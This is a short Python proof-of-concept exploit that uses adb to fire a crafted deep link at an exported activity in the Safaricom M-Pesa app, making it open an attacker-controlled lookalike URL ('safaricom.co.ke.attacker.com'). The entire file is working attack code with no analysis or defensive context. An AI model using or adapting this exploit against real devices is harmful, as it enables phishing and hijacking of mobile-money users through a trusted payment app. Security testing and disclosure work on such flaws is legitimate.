import subprocess
import sys
import urllib.parse

ADB_PATH = r"C:\Users\Administrator\AppData\Local\Android\Sdk\platform-tools\adb.exe"

def trigger_intent(target_url="https://safaricom.co.ke.attacker.com"):
    print(f"[*] Target Exploit URL: {target_url}")
    encoded_url = urllib.parse.quote(target_url, safe="")
    save_uri = f"safaricomnfcpay://openapp?route={encoded_url}"
    
    cmd = [
        ADB_PATH, "shell", "am", "start", "-W",
        "-n", "com.safaricom.mpesa.lifestyle/com.huawei.digitalpayment.consumer.nfc.ui.activity.NFCEmptyActivity",
        "--es", "saveUri", save_uri
    ]
    
    print(f"[*] Executing ADB command:\n    {' '.join(cmd)}\n")
    res = subprocess.run(cmd, capture_output=True, text=True)
    print(res.stdout)
    if res.stderr:
        print("[!] Stderr:", res.stderr)

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "https://safaricom.co.ke.attacker.com"
    trigger_intent(url)
